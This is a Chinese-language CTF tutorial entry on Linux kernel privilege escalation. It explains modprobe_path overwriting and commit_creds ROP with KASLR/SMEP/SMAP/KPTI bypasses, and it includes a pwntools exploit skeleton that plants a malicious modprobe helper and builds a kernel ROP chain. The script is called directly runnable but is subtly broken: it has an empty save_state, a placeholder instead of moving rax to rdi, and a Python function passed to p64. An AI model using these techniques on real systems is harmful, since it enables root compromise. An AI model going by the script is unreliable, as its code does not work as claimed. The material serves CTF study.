---
title: Linux 内核 pwn 入门（modprobe_path / commit_creds）
category: pwn
tags: [内核pwn, modprobe_path, commit_creds, KASLR, KPTI, LKM]
signals: [附件有 bzImage 和 rootfs.cpio, 启动脚本 run.sh 里有 -append, 题目提供 .ko 模块, 有 /dev/xxx 设备文件, commit_creds 出现在 System.map, 需要打 KASLR]
difficulty: hard
source: "CTF-Wiki Kernel Mode / ir0nstone Kernel binexp"
tools: [pwntools, gdb, qemu, ropper, vmlinux-to-elf, cpio]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 压缩包内含 `bzImage`、`rootfs.cpio`（或 `rootfs.cpio.gz`）、`run.sh`、`*.ko`。
- `run.sh` 里有 `qemu-system-x86_64 -kernel bzImage ... -append "console=ttyS0 oops=panic ... kaslr"`。
- 启动后 `ls /dev` 出现自定义设备（`/dev/ctf`、`/dev/hackme`）。
- `cat /proc/kallsyms | grep commit_creds` 能查到符号（有些题故意隐藏）。
- 题面要求「拿到 root shell 后 `cat /root/flag`」。

## 二、原理

| 维度 | 用户态 | 内核态 |
|---|---|---|
| 地址空间 | 每个进程独立 | 全局共享 1 个 |
| 保护 | NX/PIE/Canary | SMEP / SMAP / KPTI / KASLR / Stack Canary |
| 提权目标 | `system("/bin/sh")` | `commit_creds(prepare_kernel_cred(0))` |
| 栈 | 用户栈 | 内核栈（8/16KB）|

**路线 1：modprobe_path 覆盖（最简单，不需要 ROP）**

```c
// kernel/kmod.c
char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
static int call_modprobe(char *module_name, int wait) {
    ...
    argv[0] = modprobe_path;
    ...
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
```

触发条件：`execve` 一个**魔数未知的可执行文件**（例如 `\xff\xff\xff\xff`）→ 内核尝试 `request_module("binfmt-...")` → 以 root 执行 `modprobe_path`。

若能把 `modprobe_path` 改成 `/tmp/x`，再写好 `/tmp/x`（`chmod +x`、内容为 `cp /flag /tmp/f; chmod 777 /tmp/f`），执行魔数文件即可读 flag。

好处：**不需要 kernel ROP**，KPTI/SMEP 完全无关，只要能写内核内存。

**路线 2：commit_creds + ROP**

```c
commit_creds(prepare_kernel_cred(NULL));   // rdi = 0 → 新 creds
```

需要：找到 `commit_creds` / `prepare_kernel_cred` 地址（KASLR 绕过）、构造内核 ROP 链（`swapgs_restore_regs_and_return_to_usermode` 处理 KPTI）、手写 `save_state()` 保存用户态寄存器。

## 三、checksec 判读与利用思路

内核题的「保护」看启动参数：

```bash
# run.sh 典型内容
qemu-system-x86_64 -m 128M -kernel ./bzImage \
  -initrd ./rootfs.cpio -nographic -monitor none -serial stdio \
  -append "console=ttyS0 oops=panic panic=1 kaslr smep smap pti=on quiet"
```

| 参数 | 含义 | 绕过 |
|---|---|---|
| `kaslr` | 内核基址随机 | 泄露 / `_text` 爆破 / CPU 泄漏 |
| `smep` | 内核不能执行用户页 | 纯 ROP，不 ret2usr |
| `smap` | 内核不能读写用户页 | 参数需在内核可控内存 |
| `pti=on` | 页表隔离 | 走 `swapgs_restore_regs_and_return_to_usermode` |
| `oops=panic` | 一次崩就死 | 不能试错 |

漏洞类型与手法：

1. **栈溢出（模块 ioctl）** → 内核 ROP → `commit_creds`。
2. **任意写** → 改 `modprobe_path` / `core_pattern` / `poweroff_cmd`。
3. **UAF / 堆溢出** → `tty_struct` / `msg_msg` 伪造 → 改 `modprobe_path`。
4. **double fetch** → 竞态读两次。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
# 内核 pwn 通用 exp 骨架（modprobe_path 路线 + 提权后读 flag）
from pwn import *

context.binary = elf = ELF("./vmlinux", checksec=False)
context.log_level = "info"
context.arch = "amd64"

def start():
    if args.REMOTE:
        return remote(args.HOST or "TARGET", int(args.PORT or 1341))
    return process("./run.sh", shell=True)

# ---------- 用户态寄存器保存（kernel ROP 用） ----------
def save_state():
    global user_cs, user_ss, user_rflags, user_sp
    asm_code = """
    mov user_cs, cs
    mov user_ss, ss
    mov user_rflags, rflags
    mov user_sp, rsp
    """
    # 在 exp 里用内联 C 或先 dd 出一个小程序；这里给等价 Python 侧占位

def get_shell():
    p.sendline(b"cat /root/flag")
    p.interactive()

# ---------- 路线 1：modprobe_path ----------
def exp_modprobe(arbitrary_write, modprobe_path_addr):
    """
    arbitrary_write(addr, data): 题目提供的任意写原语
    modprobe_path: 内核符号地址（需 KASLR 泄露后计算）
    """
    # 1) 把 modprobe_path 改成 /tmp/x
    arbitrary_write(modprobe_path_addr, b"/tmp/x\x00")

    # 2) 在 rootfs 里准备恶意 modprobe
    p.sendline(b"echo '#!/bin/sh' > /tmp/x")
    p.sendline(b"echo 'cat /root/flag > /tmp/f' >> /tmp/x")
    p.sendline(b"echo 'chmod 777 /tmp/f' >> /tmp/x")
    p.sendline(b"chmod +x /tmp/x")

    # 3) 触发：执行魔数未知的可执行文件
    p.sendline(b"echo -ne '\\xff\\xff\\xff\\xff' > /tmp/trigger")
    p.sendline(b"chmod +x /tmp/trigger")
    p.sendline(b"/tmp/trigger")
    p.sendline(b"cat /tmp/f")
    return p.recv(timeout=3)

# ---------- 路线 2：commit_creds ROP ----------
def exp_kernel_rop(stack_overflow, kbase, symbols):
    """
    stack_overflow(payload): 题目提供的溢出原语
    kbase: 内核基址（KASLR 泄露后）
    symbols: {'commit_creds': off, 'prepare_kernel_cred': off,
              'swapgs_restore': off, 'pop_rdi': off}
    """
    commit_creds   = kbase + symbols["commit_creds"]
    prepare_cred   = kbase + symbols["prepare_kernel_cred"]
    swapgs_restore = kbase + symbols["swapgs_restore"]
    pop_rdi        = kbase + symbols["pop_rdi"]

    rop  = p64(pop_rdi) + p64(0)             # rdi = NULL
    rop += p64(prepare_cred)
    rop += p64(pop_rdi) + p64(0)             # 占位：实际把 rax 搬到 rdi
    rop += p64(commit_creds)
    rop += p64(swapgs_restore + 22)          # KPTI 返回点
    rop += p64(0) * 2                        # 占位
    rop += p64(get_shell)                    # user rip
    stack_overflow(rop)
    return p.recvall(timeout=3)

# ---------- 工具：解开 rootfs.cpio 找符号 ----------
def extract_kallsyms(cpio_path="rootfs.cpio"):
    """解开 cpio 到 ./_rootfs，之后可用 gdb/objdump 读里面的符号"""
    import subprocess, pathlib
    work = pathlib.Path("./_rootfs"); work.mkdir(exist_ok=True)
    subprocess.run(f"cd {work} && cpio -idm < ../{cpio_path}", shell=True)
    return work

if __name__ == "__main__":
    p = start()
    # 1) 先看启动信息拿内核基址（若题开了 kptr_restrict=0，/proc/kallsyms 直接可读）
    p.sendline(b"cat /proc/kallsyms | grep -E ' commit_creds| modprobe_path'")
    info(p.recv(timeout=2))
    p.interactive()
```

## 五、常见坑 / 变体

- **`modprobe_path` 长度**：`KMOD_PATH_LEN` 是 256，写 `"/tmp/x\x00"` 后必须补零截断，否则残留原字符串。
- **魔数文件触发失败**：文件前 4 字节必须是 `\xff\xff\xff\xff`（`binfmt_misc` 不接管时），且文件要有可执行权限。
- **KPTI 返回**：直接用 `iretq` 会因缺 CR3 切换崩溃，必须走 `swapgs_restore_regs_and_return_to_usermode + offset`。
- **`prepare_kernel_cred(NULL)`**：老内核支持传 NULL；5.x+ 某些版本要求传 `&init_task`，`rdi = init_task` 更稳。
- **SMAP**：传用户地址作为参数会触发 page fault，参数需放在内核可写区。

## 六、参考来源

- [CTF-Wiki: 内核态基础知识](https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/)
- [CTF-Wiki: QEMU 模拟运行环境搭建](https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/)
- [CTF-Wiki: 提权 Change Self](https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-self/)
- [CTF-Wiki: KPTI 绕过](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/kpti-bypass/)
- [ir0nstone: 覆盖 modprobe_path](https://ir0nstone.gitbook.io/notes/binexp/kernel/modprobe_path)
- [ir0nstone: 进程凭据与 commit_creds](https://ir0nstone.gitbook.io/notes/binexp/kernel/the-ultimate-aim-of-kernel-exploitation-process-credentials)
- [Linux kernel/kmod.c 源码](https://elixir.bootlin.com/linux/latest/source/kernel/kmod.c)
